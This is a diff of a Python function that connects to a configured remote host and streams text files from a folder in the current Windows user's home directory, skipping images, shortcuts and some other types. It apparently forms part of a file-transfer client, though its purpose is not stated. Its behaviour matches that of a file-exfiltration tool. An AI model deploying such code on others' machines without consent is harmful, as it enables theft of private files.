@@ -71,60 +71,32 @@ def sendFiles(filedir: str):
     with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as suck:
         suck.connect((CONNF_HOST, CONNF_PORT))
         print("Connected socket")
+        # First send the amount of times the action will execute
+        msg = str(len(listdir(full_path)))
+        suck.send(msg.encode("utf-8"))
+        while True:
+            msg = suck.recv(1024).decode("utf-8")
+            if msg == "FILE_count_recv": break
 
-        bannedtypes = [".lnk", ".rdp", ".ini",".jpg",".png",".webp",".gif",".mp4",".docx"]
+        bannedtypes = [".lnk", ".rdp", ".ini",".jpg",".png",".webp",".gif",".mp4",".docx", ".crdownload"]
         for filename in listdir(full_path): # Get each file in folder
             if isfile("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename) and not filename.endswith(tuple(bannedtypes)):
-                print("LOOP Got filename: ", filename)
-                # TODO find a way to send pdf/word documents over the socket without converting them to bytes
-                
-                # Send Filename 
-                if filename.endswith(".txt"):
-                    time.sleep(3)
-                    msg = f"FILENAME_TEXT{sep}{filename}"
-                    remain = len(msg) - 77 
-                    if remain !=0:
-                        msg = f"FILENAME_TEXT{sep}{filename}" + f" "* (remain*-1) 
-                        print("Sent filename Packet:", msg)
-                    suck.send(msg.encode("utf-8")) # FILENAME:{filename}
+                data = f"{filename}"
+                suck.send(data.encode("utf-8"))
+                msg = suck.recv(1024).decode("utf-8")
+                print(f"SERVER: {msg}")
 
-                    # THIS WILL OPEN THE FILE AS READ BYTES
-                    dict_files = open("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename, "r")
-                    print("Got file dir: ", dict_files.name)
-
-                    # ? Send the filesize before the data
-                    file_size = os.path.getsize("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename)
-                    msg = f"TXT_DATA{sep}{file_size}"
-                    remain = len(msg) - 77 
-                    
-                    if remain !=0:
-                        msg = f"TXT_DATA{sep}{file_size}" + f" "* (remain*-1) 
-                    suck.send(msg.encode("utf-8"))
-                    print(msg, len(msg))
-
-                    file_data = dict_files.read(64)
-                    while(file_data):
-                        print(":::::::::::::::::::::::::::::::::::::::::::::::::::::")        
-                        #print(f"HEADER SIZE: {len(aad)}, {aad}" )
-                        print(type(file_data), len(file_data), file_data)
-                        print(type(file_data.encode("utf-8")), len(file_data.encode("utf-8")), file_data.encode("utf-8"))
-                        print(":::::::::::::::::::::::::::::::::::::::::::::::::::::")
-
-                        suck.send(file_data.encode("utf-8"))
-                        msg = ""
-                        file_data = dict_files.read(64)
-
-                    
-                    suck.send("::END_OF_THE_SOCKET::".encode("utf-8"))
-                
-                    # TODO PUT THE 77 BYTES CHECKER INTO A FUNCTION CUZ I USE IT A LOT
-                    #time.sleep(0.5)
-                    
-                    msg = f"FINISH{sep}Completed"
-                    remain = len(msg) - 77     
-                    if remain !=0:
-                        msg = f"FINISH{sep}Completed" + f" "* (remain*-1) 
-                    suck.send(msg.encode("utf-8"))                        
-                    time.sleep(1)
-
-                print(f"Transfer completed:")
+                filepath = full_path + "\\"+filename
+                with open(filepath, "r") as f:
+                    while True:
+                        data = f.read(1024)
+            
+                        if not data:
+                            suck.send("END".encode("utf-8"))
+                            print("END")
+                            break
+            
+                        suck.send(data.encode("utf-8"))
+                        msg = suck.recv(1024).decode("utf-8")
+                print("Ended")
+            
